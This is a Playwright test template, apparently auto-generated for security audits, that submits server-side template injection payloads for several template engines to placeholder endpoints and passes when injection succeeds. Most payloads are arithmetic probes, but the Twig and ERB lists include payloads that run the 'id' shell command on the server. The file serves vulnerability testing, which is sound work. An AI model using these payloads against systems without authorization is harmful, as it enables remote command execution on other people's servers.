import { test, expect } from '@playwright/test';

/**
 * Server-Side Template Injection Security E2E Tests
 * Generated by redteam-skills generate-e2e
 *
 * PURPOSE: PoC (Proof of Concept) verification for SSTI vulnerabilities.
 * These tests PASS when template injection executes (vulnerability EXISTS).
 * Use for security auditing, not regression testing.
 *
 * WARNING: These tests send attack payloads to the target.
 * Only run against authorized targets.
 */

// Universal SSTI payloads (work across multiple engines)
const UNIVERSAL_PAYLOADS = [
  { payload: '{{7*7}}', expected: '49' },
  { payload: '${7*7}', expected: '49' },
  { payload: '<%= 7*7 %>', expected: '49' },
];

// Jinja2/Flask/Django payloads
const JINJA2_PAYLOADS = [
  { payload: '{{7*7}}', expected: '49' },
  { payload: '{{config}}', expected: 'Config' },
  { payload: "{{''.__class__}}", expected: 'str' },
  { payload: '{{request}}', expected: 'Request' },
];

// Twig (Symfony/PHP) payloads
const TWIG_PAYLOADS = [
  { payload: '{{7*7}}', expected: '49' },
  { payload: '{{_self}}', expected: 'Template' },
  { payload: "{{['id']|filter('system')}}", expected: 'uid=' },
];

// Blade (Laravel) payloads
const BLADE_PAYLOADS = [
  { payload: '{{7*7}}', expected: '49' },
  { payload: '@php echo 7*7; @endphp', expected: '49' },
  { payload: '${7*7}', expected: '49' },
];

// ERB (Ruby) payloads
const ERB_PAYLOADS = [
  { payload: '<%= 7*7 %>', expected: '49' },
  { payload: '<%= system("id") %>', expected: 'uid=' },
];

// Freemarker (Java) payloads
const FREEMARKER_PAYLOADS = [
  { payload: '${7*7}', expected: '49' },
  { payload: '<#assign x=7*7>${x}', expected: '49' },
];

test.describe('SSTI Security Tests', () => {
  /**
   * Universal SSTI Test
   * Tests common template syntax patterns across multiple engines
   */
  test('{{VULN_ID}}: Universal SSTI at {{ENDPOINT}}', async ({ page }) => {
    for (const { payload, expected } of UNIVERSAL_PAYLOADS) {
      await page.goto('{{ENDPOINT}}');

      // Inject SSTI payload
      await page.fill('{{INPUT_SELECTOR}}', payload);
      await page.click('button[type="submit"]');

      await page.waitForLoadState('networkidle');

      // Check if template was executed
      const content = await page.content();
      const isVulnerable = content.includes(expected);

      // PoC: Test PASSES when template execution result is detected
      expect(isVulnerable).toBe(true);
    }
  });

  /**
   * Jinja2 SSTI Test (Flask/Django)
   * Tests Jinja2-specific template injection patterns
   */
  test('{{VULN_ID}}: Jinja2 SSTI at {{ENDPOINT}}', async ({ page }) => {
    for (const { payload, expected } of JINJA2_PAYLOADS) {
      await page.goto('{{ENDPOINT}}');

      await page.fill('{{INPUT_SELECTOR}}', payload);
      await page.click('button[type="submit"]');

      await page.waitForLoadState('networkidle');

      const content = await page.content();
      const isVulnerable = content.includes(expected);

      expect(isVulnerable).toBe(true);
    }
  });

  /**
   * Twig SSTI Test (Symfony/PHP)
   * Tests Twig-specific template injection patterns
   */
  test('{{VULN_ID}}: Twig SSTI at {{ENDPOINT}}', async ({ page }) => {
    for (const { payload, expected } of TWIG_PAYLOADS) {
      await page.goto('{{ENDPOINT}}');

      await page.fill('{{INPUT_SELECTOR}}', payload);
      await page.click('button[type="submit"]');

      await page.waitForLoadState('networkidle');

      const content = await page.content();
      const isVulnerable = content.includes(expected);

      expect(isVulnerable).toBe(true);
    }
  });

  /**
   * Blade SSTI Test (Laravel)
   * Tests Blade-specific template injection patterns
   */
  test('{{VULN_ID}}: Blade SSTI at {{ENDPOINT}}', async ({ page }) => {
    for (const { payload, expected } of BLADE_PAYLOADS) {
      await page.goto('{{ENDPOINT}}');

      await page.fill('{{INPUT_SELECTOR}}', payload);
      await page.click('button[type="submit"]');

      await page.waitForLoadState('networkidle');

      const content = await page.content();
      const isVulnerable = content.includes(expected);

      expect(isVulnerable).toBe(true);
    }
  });

  /**
   * ERB SSTI Test (Ruby on Rails)
   * Tests ERB-specific template injection patterns
   */
  test('{{VULN_ID}}: ERB SSTI at {{ENDPOINT}}', async ({ page }) => {
    for (const { payload, expected } of ERB_PAYLOADS) {
      await page.goto('{{ENDPOINT}}');

      await page.fill('{{INPUT_SELECTOR}}', payload);
      await page.click('button[type="submit"]');

      await page.waitForLoadState('networkidle');

      const content = await page.content();
      const isVulnerable = content.includes(expected);

      expect(isVulnerable).toBe(true);
    }
  });

  /**
   * Authenticated SSTI Test
   * Logs in first, then tests for SSTI in authenticated context
   */
  test('{{VULN_ID}}: Authenticated SSTI at {{ENDPOINT}}', async ({ page }) => {
    // Login first
    await page.goto('{{AUTH_ENDPOINT}}');
    await page.fill('#email', process.env.AUTH_EMAIL || '{{AUTH_EMAIL}}');
    await page.fill('#password', process.env.AUTH_PASSWORD || '{{AUTH_PASSWORD}}');
    await page.click('button[type="submit"]');

    // Wait for authentication
    await page.waitForURL((url) => !url.pathname.includes('login'), { timeout: 10000 });

    // Test for SSTI after authentication
    await page.goto('{{ENDPOINT}}');
    await page.fill('{{INPUT_SELECTOR}}', '{{7*7}}');
    await page.click('button[type="submit"]');
    await page.waitForLoadState('networkidle');

    const content = await page.content();
    const isVulnerable = content.includes('49');

    expect(isVulnerable).toBe(true);
  });
});
